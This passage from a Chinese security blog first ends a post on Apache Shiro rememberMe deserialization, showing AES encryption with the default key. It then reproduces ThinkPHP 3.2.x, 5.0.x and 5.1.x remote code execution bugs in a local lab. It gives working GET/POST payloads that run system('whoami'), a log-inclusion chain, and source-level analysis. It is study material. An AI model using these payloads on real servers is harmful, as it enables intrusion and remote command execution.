Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>继续用P神的Demo</p>
<p>在上面的exp后面加上加密代码，将加密之后的字符串放到<code>rememberMe</code>上，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line"><span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">ByteSource ciphertext = aes.encrypt(byteArrayOutputStream.toByteArray(), key);</span><br><span class="line">System.out.printf(ciphertext.toString());</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0b49927ef99643d298241d7a989fc489.png" alt="image-20220629170351741"></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP框架漏洞复现</title>
    <url>/2022/05/15/ThinkPHP%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>因为近期状态不是很好，有时候甚至不知道该去做什么（明明还有那么多东西没有学），打算复现java相关的漏洞的时候总是因为各种原因没办法一下子完成，每次都需要重新看一遍（心累了）。</p>
<p>最后还是决定一下仔细复现一下ThinkPHP漏洞，都是以前做题或者比赛的时候遇到的，就当复习了，之后应该会时不时更新一下，算是个人学习笔记，如果有任何错误的地方欢迎师傅们指正</p>
<p>thinkphp3.2.xRCE、thinkphp5.0.xRCE、thinkphp5.1.xRCE、yii2反序列化……</p>
</blockquote>
<span id="more"></span>

<h2 id="ThinkPHP3-2-xRCE"><a href="#ThinkPHP3-2-xRCE" class="headerlink" title="ThinkPHP3.2.xRCE"></a>ThinkPHP3.2.xRCE</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>thinkphp3.2.3</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
<li>debug true</li>
</ul>
<p>1.直接上payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2007/?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>可以在本地发现日志文件将代码记录了,不过如果直接传的话会出现乱码，最好用bp抓包修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.49.1:2007/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/22_05_13.log</span><br></pre></td></tr></table></figure>

<p>可以发现代码成功执行啦</p>
<p><img src="https://img-blog.csdnimg.cn/8f33c6b19e64454ebaeed6271480038d.png" alt="img"></p>
<ul>
<li>debug false</li>
</ul>
<p>利用报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2007/?c=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>



<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先传入的<code>m|c|a</code>为系统环境变量，通过修改变量的值使得进入特定的控制器，而在后面我们传进去value也会传进<code>IndexController</code>的index方法，并在assign之后可以在show方法的时候实现文件包含</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220513175918430.png" alt="image-20220513175918430"></p>
<p><code>IndexController</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="string">&#x27;……&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行<code>assign</code>,直接跟进，在这里会调用到<code>View</code>类的assign方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;view-&gt;assign(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>View::assign</code>，将我们传进去的值给<code>$this-&gt;tVar</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tVar   =  array_merge(<span class="keyword">$this</span>-&gt;tVar,<span class="variable">$name</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tVar[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Controller:show</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$content</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;display(<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>View:display</code>，会在fetch方法中将<code>$this-&gt;tVar</code>进行解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$templateFile</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    G(<span class="string">&#x27;viewStartTime&#x27;</span>);</span><br><span class="line">    <span class="comment">// 视图开始标签</span></span><br><span class="line">    Hook::listen(<span class="string">&#x27;view_begin&#x27;</span>,<span class="variable">$templateFile</span>);</span><br><span class="line">    <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;fetch(<span class="variable">$templateFile</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    <span class="comment">// 输出模板内容</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render(<span class="variable">$content</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>);</span><br><span class="line">    <span class="comment">// 视图结束标签</span></span><br><span class="line">    Hook::listen(<span class="string">&#x27;view_end&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8deea29be3ad40f7b0b4659127a430a9.png" alt="img"></p>
<p><code>Hook:listen</code>，由于我们打开了debug模式，使得这些值都会进行记录，就比如trace就会实现日志的格式并写入相应的日志文件中</p>
<p>而listen里面最为重要的就是<code>exec</code>，这里会将整个<code>$param</code>都会传进去，即包括了我们自己写入的value</p>
<p><img src="https://img-blog.csdnimg.cn/dcc11ff18e5c455a95236eb3b2e86153.png" alt="img"></p>
<p><code>Hook:exec</code>，会去调用某个继承<code>Behavior</code>抽象类的<code>run</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$tag</span>,&amp;<span class="variable">$params</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;Behavior&#x27;</span> == substr(<span class="variable">$name</span>,-<span class="number">8</span>) )&#123;</span><br><span class="line">        <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">        <span class="variable">$tag</span>    =   <span class="string">&#x27;run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$addon</span>   = <span class="keyword">new</span> <span class="variable">$name</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addon</span>-&gt;<span class="variable">$tag</span>(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Behavior\ParseTemplateBehavior:run</code>，由于缓存的文件都为空，并且是thinkphp的模板，所有直接进去第一个else，直接调用到了<code>Think\Template:fetch</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">&amp;<span class="variable">$_data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$engine</span>             =   strtolower(C(<span class="string">&#x27;TMPL_ENGINE_TYPE&#x27;</span>));</span><br><span class="line">        <span class="variable">$_content</span>           =   <span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>])?<span class="variable">$_data</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]    =   !<span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])?<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]:C(<span class="string">&#x27;TMPL_CACHE_PREFIX&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;think&#x27;</span>==<span class="variable">$engine</span>)&#123; <span class="comment">// 采用Think模板引擎</span></span><br><span class="line">            <span class="keyword">if</span>((!<span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])) </span><br><span class="line">                ||  <span class="keyword">$this</span>-&gt;checkCache(<span class="variable">$_data</span>[<span class="string">&#x27;file&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])) &#123; <span class="comment">// 缓存有效</span></span><br><span class="line">                <span class="comment">//载入模版缓存文件</span></span><br><span class="line">                Storage::load(C(<span class="string">&#x27;CACHE_PATH&#x27;</span>).<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>].md5(<span class="variable">$_content</span>).C(<span class="string">&#x27;TMPL_CACHFILE_SUFFIX&#x27;</span>),<span class="variable">$_data</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$tpl</span> = Think::instance(<span class="string">&#x27;Think\\Template&#x27;</span>);</span><br><span class="line">                <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">                <span class="variable">$tpl</span>-&gt;fetch(<span class="variable">$_content</span>,<span class="variable">$_data</span>[<span class="string">&#x27;var&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$templateFile</span>,<span class="variable">$templateVar</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;tVar         =   <span class="variable">$templateVar</span>;</span><br><span class="line">    <span class="variable">$templateCacheFile</span>  =   <span class="keyword">$this</span>-&gt;loadTemplate(<span class="variable">$templateFile</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    Storage::load(<span class="variable">$templateCacheFile</span>,<span class="keyword">$this</span>-&gt;tVar,<span class="literal">null</span>,<span class="string">&#x27;tpl&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对数组进行变量覆盖使得我们传进去的，<code>value[_filename]</code>的值变为变量覆盖之后<code>$_filename</code>的值，实现日志文件包含</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$_filename</span>,<span class="variable">$vars</span>=<span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(!is_null(<span class="variable">$vars</span>))&#123;</span><br><span class="line">          extract(<span class="variable">$vars</span>, EXTR_OVERWRITE); </span><br><span class="line">           <span class="comment">// [_filename]=&#x27;./Application/Runtime/Logs/Home/XX.XX.XX.log&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">include</span> <span class="variable">$_filename</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP5-0-xRCE"><a href="#ThinkPHP5-0-xRCE" class="headerlink" title="ThinkPHP5.0.xRCE"></a>ThinkPHP5.0.xRCE</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>thinkphp5.0.10</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p><img src="https://img-blog.csdnimg.cn/27f610de2b89421baa6de433d240cf2e.png" alt="img"></p>
<p>poc：</p>
<p>get:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p>post:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=captcha</span><br><span class="line">post:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><ul>
<li>POST</li>
</ul>
<p>首先既然是RCE，那就先要找到我们最后想要利用的执行代码的方法，可以全局搜索一下一些常用的方法，比如<code>eval</code>|<code>call_user_func</code>之类的</p>
<p>全局搜索一下发现<code>call_user_func</code>很多，但是实际上可以用的很少，不过可以在<code>Request::filterValue</code>也发现了该方法，那么可以先来分析一下这里的<code>call_user_func</code>怎么样才能正确利用，这里回调函数为<code>$filter</code>，变量为<code>$value</code>，那么重点就是看两个参数是怎么传进去的，那就去看一下会在哪里调用到<code>filterValue</code></p>
<p><img src="https://img-blog.csdnimg.cn/10381b87335c45b28a56231326d8cebc.png" alt="img"></p>
<blockquote>
<p> 但是作为一只菜鸡来说，还不会自己挖洞那就只能直接跟着payload的思路走了</p>
</blockquote>
<p>贴上调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request.php:1060, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1007, array_walk_recursive()</span><br><span class="line">Request.php:1007, think\Request-&gt;input()</span><br><span class="line">Request.php:642, think\Request-&gt;param()</span><br><span class="line">App.php:304, think\App::exec()</span><br><span class="line">Request.php:501, think\Request-&gt;method()</span><br><span class="line">Request.php:524, think\Request-&gt;isGet()</span><br><span class="line">Route.php:1507, think\Route::parseRule()</span><br><span class="line">Route.php:1189, think\Route::checkRule()</span><br><span class="line">Route.php:950, think\Route::checkRoute()</span><br><span class="line">Route.php:873, think\Route::check()</span><br><span class="line">App.php:562, think\App::routeCheck()</span><br><span class="line">App.php:123, think\App::run()</span><br><span class="line">start.php:18, require()</span><br><span class="line">index.php:17, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p><code>App::run</code>，整个应用从这开始，通过调用可用方法检测路由以及获取回调函数等，并在最后返回响应值</p>
<p>此时的<code>$request</code>为<code>Request</code>，<code>config</code>被初始化为配置信息</p>
<p><img src="https://img-blog.csdnimg.cn/75394cae4fa944b28dabdcf2463013cc.png" alt="img"></p>
<p><code>App::routeCheck</code>进行路由检测，而<code>$path</code>会调用到<code>Request::pathinfo</code>，其中config[‘var_pathinfo’]所对应的值为<code>s</code>所以如果在url中利用get方法传<code>s=?</code>其值即为路由</p>
<p>而<code>$depr</code>的值为<code>/</code></p>
<p><img src="https://img-blog.csdnimg.cn/239853ebe1a54f479ef31754c0ec92db.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/7d1957859e6542de8c9f66b800fb9586.png" alt="img"></p>
<p>之后会通过<code>Route::check</code>调用到了<code>Request::method</code></p>
<p><img src="https://img-blog.csdnimg.cn/96efd174745d48c1bb5c4d959cb449e9.png" alt="img"></p>
<p><code>Request::method</code>如图（在后续更新中会对<code>$this-&gt;method</code>的值进行白名单过滤</p>
<p><img src="https://img-blog.csdnimg.cn/751025e4ef774512a36cff0886f6c732.png" alt="img"></p>
<p>根据代码我们可以知道我们可以通过post上传<code>_method</code>，再在下面执行<code>$this-&gt;$_method($_POST)</code></p>
<p>由于对整个thinkphp框架还是不够了解，所以这里我就直接把在<code>Config:get</code>中进行vard_ump得知返回值为<code>_method</code>，那么我们就可以通过post上传<code>_method</code>来控制执行的方法了，而payload中传进去的为<code>__construct</code></p>
<p><code>Request::__construct</code>，其中<code>options</code>为我们<code>POST</code>数组，会用property_exists检测此类中是否存在该属性，如果存在则直接赋值导致我们可以通过post传入同名属性从而控制所有属性的值，而<code>input</code>会将post字符串保存下来</p>
<p>最后<code>method</code>方法将属性<code>method</code>返回，而<code>method</code>属性已经被我们修改为<code>get</code></p>
<p><img src="https://img-blog.csdnimg.cn/4d7b9eb3905146c6805a4fc3af3d8a26.png" alt="img"></p>
<p>之后就是继续检测s传进的路由并返回URL调度，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\App.php:567:</span><br><span class="line">array (size=3)</span><br><span class="line">  &#x27;type&#x27; =&gt; string &#x27;method&#x27; (length=6)</span><br><span class="line">  &#x27;method&#x27; =&gt; </span><br><span class="line">    array (size=2)</span><br><span class="line">      0 =&gt; string &#x27;\think\captcha\CaptchaController&#x27; (length=32)</span><br><span class="line">      1 =&gt; string &#x27;index&#x27; (length=5)</span><br><span class="line">  &#x27;var&#x27; =&gt; </span><br><span class="line">    array (size=0)</span><br><span class="line">      empty</span><br></pre></td></tr></table></figure>

<p>在之后的<code>exec</code>根据URL调度中<code>type =&gt; &#39;method&#39;</code>从而执行回调方法，调用到<code>param</code>方法，再调用到<code>input</code>方法将post中所请求的信息等合并通过<code>$data</code>传了进去，从而在调用到<code>Request::filterValue</code>的时候<code>$data</code>包含了我们所传入的信息.</p>
<p><img src="https://img-blog.csdnimg.cn/980cd3bb96da47d9949a1387cf568ce4.png" alt="img"></p>
<p>最终到达<code>Request::filterValue</code>，此时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter =&gt; system</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\Request.php:1004:</span><br><span class="line">array (size=5)</span><br><span class="line">  &#x27;_method&#x27; =&gt; string &#x27;__construct&#x27; (length=11)</span><br><span class="line">  &#x27;filter&#x27; =&gt; </span><br><span class="line">    array (size=1)</span><br><span class="line">      0 =&gt; string &#x27;system&#x27; (length=6)</span><br><span class="line">  &#x27;method&#x27; =&gt; string &#x27;get&#x27; (length=3)</span><br><span class="line">  &#x27;ameuu&#x27; =&gt; </span><br><span class="line">    array (size=1)</span><br><span class="line">      0 =&gt; string &#x27;whoami&#x27; (length=6)</span><br><span class="line">  &#x27;id&#x27; =&gt; null</span><br></pre></td></tr></table></figure>

<p>通过<code>call_user_func</code>执行回调函数而执行数组的五个参数，从而最终实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10381b87335c45b28a56231326d8cebc.png" alt="img"></p>
<ul>
<li>get</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">App.php:200, think\App::invokeMethod()</span><br><span class="line">App.php:412, think\App::module()</span><br><span class="line">App.php:299, think\App::exec()</span><br><span class="line">App.php:125, think\App::run()</span><br><span class="line">start.php:18, require()</span><br><span class="line">index.php:17, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p>get最后利用反射的方法进行代码执行</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHelloTo</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;HelloWorld&#x27;</span>, <span class="string">&#x27;sayHelloTo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$reflectionMethod</span>-&gt;invokeArgs(<span class="keyword">new</span> HelloWorld(), <span class="keyword">array</span>(<span class="string">&#x27;Mike&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/9e941f6451df4f9ab81e4e160523adb1.png" alt="img"></p>
<p>前面到exec函数调用都一样，但是由于s的值变成了<code>index/\think\app/invokefunction</code>，所以在检测路由的时候所返回的结果发生变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\App.php:108:</span><br><span class="line">array (size=2)</span><br><span class="line">  &#x27;type&#x27; =&gt; string &#x27;module&#x27; (length=6)</span><br><span class="line">  &#x27;module&#x27; =&gt; </span><br><span class="line">    array (size=3)</span><br><span class="line">      0 =&gt; string &#x27;index&#x27; (length=5)</span><br><span class="line">      1 =&gt; string &#x27;\think\app&#x27; (length=10)</span><br><span class="line">      2 =&gt; string &#x27;invokefunction&#x27; (length=14)</span><br></pre></td></tr></table></figure>

<p>这也使得在exec中我们所执行的方法为</p>
<p><img src="https://img-blog.csdnimg.cn/c188bdd511d3441cad878d6ee38d0bfe.png" alt="img"></p>
<p>再调用<code>App::invokeMethod</code>执行<code>&#123;think\app,invokefunction&#125;</code>方法，而该方法的参数通过<code>App::bindParams</code>进行获取</p>
<p><img src="https://img-blog.csdnimg.cn/44402c24b30b41b199ef58ae102f72b7.png" alt="img"></p>
<p>获取到我们所传进去的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function=call_user_func</span><br><span class="line">var[0]=system</span><br><span class="line">var[1][]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7e6879d690cf42a0831abb5ba740f479.png" alt="img"></p>
<p>之后就是利用反射执行<code>call_user_func</code></p>
<h2 id="ThinkPHP5-1-xRCE"><a href="#ThinkPHP5-1-xRCE" class="headerlink" title="ThinkPHP5.1.xRCE"></a>ThinkPHP5.1.xRCE</h2><h3 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h3><p>thinkphp5.1.x</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">or</span><br><span class="line">?s=index/\think\container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Container.php:320, think\Container-&gt;invokeFunction()</span><br><span class="line">Container.php:372, ReflectionMethod-&gt;invokeArgs()</span><br><span class="line">Container.php:372, think\Container-&gt;invokeReflectMethod()</span><br><span class="line">Module.php:129, think\route\dispatch\Module-&gt;think\route\dispatch\&#123;closure&#125;()</span><br><span class="line">Middleware.php:176, call_user_func_array:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:176&#125;()</span><br><span class="line">Middleware.php:176, think\Middleware-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:121, call_user_func:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:121&#125;()</span><br><span class="line">Middleware.php:121, think\Middleware-&gt;dispatch()</span><br><span class="line">Module.php:134, think\route\dispatch\Module-&gt;exec()</span><br><span class="line">Dispatch.php:167, think\route\Dispatch-&gt;run()</span><br><span class="line">App.php:432, think\App-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:176, call_user_func_array:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:176&#125;()</span><br><span class="line">Middleware.php:176, think\Middleware-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:121, call_user_func:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:121&#125;()</span><br><span class="line">Middleware.php:121, think\Middleware-&gt;dispatch()</span><br><span class="line">App.php:435, think\App-&gt;run()</span><br><span class="line">index.php:21, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p>最终利用点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$function</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$args</span> = <span class="keyword">$this</span>-&gt;bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="variable">$function</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ReflectionException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;function not exists: &#x27;</span> . <span class="variable">$function</span> . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>GET可用</li>
</ul>
<p>和前面一样，依旧从<code>App::run</code>开始，会先进行路由检测，而通过thinkphp传参，我们利用get传<code>s</code>（相当于PATHINFO），将我们要利用的控制器传进去</p>
